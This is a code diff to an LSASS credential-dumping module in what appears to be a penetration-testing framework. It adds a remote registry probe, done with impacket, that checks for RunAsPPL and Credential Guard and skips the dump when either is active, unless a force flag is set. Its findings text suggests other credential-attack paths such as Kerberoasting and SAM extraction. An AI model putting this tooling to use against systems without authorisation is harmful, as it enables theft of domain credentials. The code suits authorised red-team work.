@@ -221,6 +221,7 @@ class LsassDumpModule(BaseModule):
         domain   = getattr(ctx, "domain", "")
         technique = "comsvcs"
 
+        force = False
         params = getattr(ctx, "params", {})
         if isinstance(params, LsassDumpParams):
             target = params.target or target
@@ -228,6 +229,7 @@ class LsassDumpModule(BaseModule):
             password = params.password.get_secret_value() if hasattr(params.password, "get_secret_value") else (params.password or "")
             domain = params.domain or domain
             technique = params.technique or "comsvcs"
+            force = getattr(params, "force", False)
         elif isinstance(params, dict):
             target = params.get("target") or target
             username = params.get("username", "")
@@ -235,6 +237,7 @@ class LsassDumpModule(BaseModule):
             password = raw_pass.get_secret_value() if hasattr(raw_pass, "get_secret_value") else (raw_pass or "")
             domain = params.get("domain") or domain
             technique = params.get("technique", "comsvcs")
+            force = bool(params.get("force", False))
 
         target = sanitize_hostname(target)
 
@@ -251,6 +254,7 @@ class LsassDumpModule(BaseModule):
         findings, raw = await self.run(
             target=target, username=username, password=password,
             domain=domain, lmhash=lmhash, nthash=nthash, technique=technique,
+            force=force,
         )
 
         # Cryptographic Evidence Records with SHA-256 Merkle Provenance
@@ -334,7 +338,7 @@ class LsassDumpModule(BaseModule):
     @trace_module("windows.lsass_dump")
     async def run(self, target: str, username: str, password: str = "",
                   domain: str = "", lmhash: str = "", nthash: str = "",
-                  technique: str = "comsvcs", **kwargs: Any):
+                  technique: str = "comsvcs", force: bool = False, **kwargs: Any):
         await self.before_request(target, "default")
         logger.warning("lsass_dump_start", target=target, technique=technique,
                        msg="HIGH_NOISE - EDR_ALERT_LIKELY")
@@ -342,6 +346,64 @@ class LsassDumpModule(BaseModule):
               source="operator", target=target, detail=f"technique={technique}")
 
         loop = asyncio.get_running_loop()
+
+        # 1. Probe Credential Guard & RunAsPPL protections before attempting dump
+        protections = await loop.run_in_executor(
+            None,
+            lambda: self._check_lsass_protections_sync(target, username, password, domain, lmhash, nthash),
+        )
+
+        if (protections.get("runasppl") or protections.get("credential_guard") or protections.get("vbs")) and not force:
+            active_mitigations = []
+            if protections.get("runasppl"):
+                active_mitigations.append("RunAsPPL (LSA Protected Process Light)")
+            if protections.get("credential_guard"):
+                active_mitigations.append("Credential Guard (LsaIso.exe VBS Isolation)")
+            if protections.get("vbs") and not protections.get("credential_guard"):
+                active_mitigations.append("Virtualization-Based Security (VBS)")
+
+            mitigations_str = " + ".join(active_mitigations)
+            self.finding(
+                title=f"Credential Guard / RunAsPPL Active on {target} (LSASS Memory Protected)",
+                description=(
+                    f"Remote posture assessment on {target} confirmed active LSASS hardening: {mitigations_str}. "
+                    "Process memory is protected by the Windows kernel (RunAsPPL) and/or isolated in Virtual "
+                    "Secure Mode (Credential Guard). Direct memory extraction (comsvcs / procdump / secretsdump) "
+                    "is blocked by the kernel and triggers EDR alerts without yielding plaintext secrets."
+                ),
+                severity=Severity.LOW,
+                mitre_technique="T1003.001",
+                mitre_tactic="Credential Access",
+                evidence={
+                    "target": target,
+                    "active_mitigations": active_mitigations,
+                    "protection_details": protections.get("details", {}),
+                    "posture_status": "COMPLIANT_HARDENED",
+                },
+                remediation=(
+                    "Target is compliant with modern credential protection standards. "
+                    "To test alternative attack paths that do not touch LSASS memory: "
+                    "1. Evaluate DPAPI secrets via windows.dpapi. "
+                    "2. Audit token impersonation vectors via windows.token_impersonation. "
+                    "3. Perform offline registry extraction (SAM/SECURITY) via windows.lsa_secrets. "
+                    "4. Execute Kerberoasting via ad.kerberoast."
+                ),
+                host=target,
+                confidence=1.0,
+            )
+
+            raw = {
+                "target": target,
+                "technique": technique,
+                "hash_count": 0,
+                "hashes": [],
+                "ntlm_hashes": [],
+                "kerberos_tickets": [],
+                "protections": protections,
+                "mitigated": True,
+            }
+            await self.noise.jitter.sleep()
+            return self._findings[:], raw
 
         if technique == "secretsdump":
             # Direct via impacket - no touch disk, requires DA
@@ -393,12 +455,102 @@ class LsassDumpModule(BaseModule):
             "hashes":       [{"username": h["username"], "rid": h.get("rid", ""),
                               "nt_hash": h["nt_hash"]}
                              for h in hashes],
+            "protections":  protections,
+            "mitigated":    False,
         }
 
         raw["ntlm_hashes"] = raw.get("hashes", [])  # OUTPUTS key
         raw["kerberos_tickets"] = []  # OUTPUTS key
         await self.noise.jitter.sleep()
         return self._findings[:], raw
+
+    def _check_lsass_protections_sync(
+        self, target: str, username: str, password: str, domain: str,
+        lmhash: str, nthash: str,
+    ) -> dict[str, Any]:
+        """
+        Query remote registry for LSASS Protection (RunAsPPL) and Virtualization-Based Security (Credential Guard).
+        HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa -> RunAsPPL, RunAsPPLBoot, LsaCfgFlags
+        HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard -> EnableVirtualizationBasedSecurity
+        """
+        res: dict[str, Any] = {
+            "runasppl": False,
+            "credential_guard": False,
+            "vbs": False,
+            "details": {},
+        }
+        try:
+            from impacket.smbconnection import SMBConnection
+            from impacket.dcerpc.v5 import transport, rrp
+            from impacket.dcerpc.v5.rrp import (
+                hOpenLocalMachine, hBaseRegOpenKey, hBaseRegQueryValue,
+                hBaseRegCloseKey, DCERPCException,
+            )
+
+            smb = SMBConnection(target, target, timeout=10)
+            smb.login(username, password, domain, lmhash, nthash)
+
+            rpc_transport = transport.DCERPCTransportFactory(f"ncacn_np:{target}[\\pipe\\winreg]")
+            rpc_transport.set_smb_connection(smb)
+            dce = rpc_transport.get_dce_rpc()
+            dce.connect()
+            dce.bind(rrp.MSRPC_UUID_RRP)
+
+            hklm = hOpenLocalMachine(dce)["phKey"]
+
+            # 1. Check LSA registry keys
+            try:
+                lsa_key = hBaseRegOpenKey(dce, hklm, "SYSTEM\\CurrentControlSet\\Control\\Lsa")["phkResult"]
+                for val_name in ("RunAsPPL", "RunAsPPLBoot", "LsaCfgFlags"):
+                    try:
+                        val_data = hBaseRegQueryValue(dce, lsa_key, val_name)[1]
+                        if isinstance(val_data, int):
+                            res["details"][val_name] = val_data
+                            if val_name in ("RunAsPPL", "RunAsPPLBoot") and val_data in (1, 2):
+                                res["runasppl"] = True
+                            if val_name == "LsaCfgFlags" and val_data in (1, 2):
+                                res["credential_guard"] = True
+                        elif isinstance(val_data, bytes) and len(val_data) >= 4:
+                            import struct
+                            int_val = struct.unpack("<I", val_data[:4])[0]
+                            res["details"][val_name] = int_val
+                            if val_name in ("RunAsPPL", "RunAsPPLBoot") and int_val in (1, 2):
+                                res["runasppl"] = True
+                            if val_name == "LsaCfgFlags" and int_val in (1, 2):
+                                res["credential_guard"] = True
+                    except (DCERPCException, Exception):
+                        pass
+                hBaseRegCloseKey(dce, lsa_key)
+            except (DCERPCException, Exception):
+                pass
+
+            # 2. Check DeviceGuard VBS key
+            try:
+                dg_key = hBaseRegOpenKey(dce, hklm, "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard")["phkResult"]
+                try:
+                    vbs_val = hBaseRegQueryValue(dce, dg_key, "EnableVirtualizationBasedSecurity")[1]
+                    if isinstance(vbs_val, int) and vbs_val == 1:
+                        res["vbs"] = True
+                        res["details"]["EnableVirtualizationBasedSecurity"] = 1
+                    elif isinstance(vbs_val, bytes) and len(vbs_val) >= 4:
+                        import struct
+                        int_val = struct.unpack("<I", vbs_val[:4])[0]
+                        res["details"]["EnableVirtualizationBasedSecurity"] = int_val
+                        if int_val == 1:
+                            res["vbs"] = True
+                except (DCERPCException, Exception):
+                    pass
+                hBaseRegCloseKey(dce, dg_key)
+            except (DCERPCException, Exception):
+                pass
+
+            hBaseRegCloseKey(dce, hklm)
+            dce.disconnect()
+            smb.logoff()
+        except Exception as exc:
+            logger.debug("lsass_protection_check_failed", target=target, error=str(exc)[:80])
+
+        return res
 
     def _secretsdump_sync(self, target: str, username: str, password: str,
                            domain: str, lmhash: str, nthash: str) -> list[dict]:
